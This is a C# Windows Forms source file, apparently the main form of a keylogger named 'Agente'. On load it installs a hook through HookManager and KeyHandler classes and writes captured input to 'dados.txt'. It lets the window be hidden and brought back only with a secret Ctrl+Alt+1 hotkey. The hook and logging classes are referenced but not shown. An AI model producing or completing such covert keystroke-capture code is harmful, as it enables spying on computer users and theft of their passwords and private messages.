using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Agente1
{
    public partial class Agente : Form
    {
        private const int MOD_CONTROL = 0x0002;
        private const int MOD_ALT = 0x0001;
        private const int HOTKEY_ID = 1;
        private const int VK_1 = 0x31;

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        private HookManager hookManager;
        private FileLogger fileLogger;
        private KeyHandler keyHandler;

        public Agente()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "dados.txt");
            fileLogger = new FileLogger(filePath);
            keyHandler = new KeyHandler(fileLogger);
            hookManager = new HookManager(keyHandler,fileLogger);

            hookManager.SetHook();
            fileLogger.LogSessionStart();
            RegisterHotKey(this.Handle, HOTKEY_ID, MOD_CONTROL | MOD_ALT, VK_1);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            hookManager.Unhook();
            UnregisterHotKey(this.Handle, HOTKEY_ID);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        protected override void WndProc(ref Message m)
        {
            const int WM_HOTKEY = 0x0312;
            if (m.Msg == WM_HOTKEY && m.WParam.ToInt32() == HOTKEY_ID)
            {
                this.Show();
                this.WindowState = FormWindowState.Normal;
            }
            base.WndProc(ref m);
        }
    }
}
